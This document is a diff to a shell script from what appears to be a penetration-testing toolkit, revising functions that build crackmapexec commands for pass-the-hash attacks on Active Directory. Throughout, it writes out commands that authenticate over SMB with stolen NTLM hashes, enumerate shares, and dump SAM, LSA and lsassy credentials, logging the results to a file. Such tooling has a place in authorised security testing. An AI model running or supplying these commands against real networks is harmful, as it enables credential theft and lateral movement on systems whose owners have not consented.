@@ -13,12 +13,11 @@ The nb-ad-pth namespace contains commands for pass-the-hash attack on Active Dir
 Commands
 --------
 nb-ad-pth-install         installs dependencies
-nb-ad-pth-pass            pass the password
-nb-ad-pth-exploit         pth exploit command
-nb-ad-pth-sam             dump SAM hashes
+nb-ad-pth-pass            pass the password/hash
 nb-ad-pth-enum            enumerate shares
-nb-ad-pth-lsa             use CME to dump LSA
-nb-ad-pth-lsassy          use CME to dump LSASSY
+nb-ad-pth-sam             dump SAM hashes
+nb-ad-pth-lsa             dump LSA hashes
+nb-ad-pth-lsassy          dump LSASSY hashes
 
 DOC
 }
@@ -46,29 +45,43 @@ nb-ad-pth-pass() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} --local-auth"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} | tee -a $(__netpath)/cme-sweep.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -H ${__HASH} --local-auth"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee -a $(__netpath)/cme-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
     fi
 }
 
-nb-ad-pth-exploit() {
+nb-ad-pth-enum() {
     __check-project
     nb-vars-set-network
     echo
-    __ask "Enter a user account"
-  	__check-user
+    __ask "Enter a user account/user list"
+	  __check-user
     echo
-  	__ask "Enter a NTLM hash"
-  	__check-hash
 
-	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth"
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        __check-pass
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} --shares | tee -a $(__netpath)/cme-sweep.txt"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares | tee -a $(__netpath)/cme-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
 }
 
 nb-ad-pth-sam() {
@@ -82,19 +95,6 @@ nb-ad-pth-sam() {
 	  __check-hash
 
 	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --sam"
-}
-
-nb-ad-pth-enum() {
-    __check-project
-    nb-vars-set-network
-    echo
-    __ask "Enter a user account/user list"
-	  __check-user
-    echo
-	  __ask "Enter a NTLM hash"
-	  __check-hash
-
-	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares"
 }
 
 nb-ad-pth-lsa() {
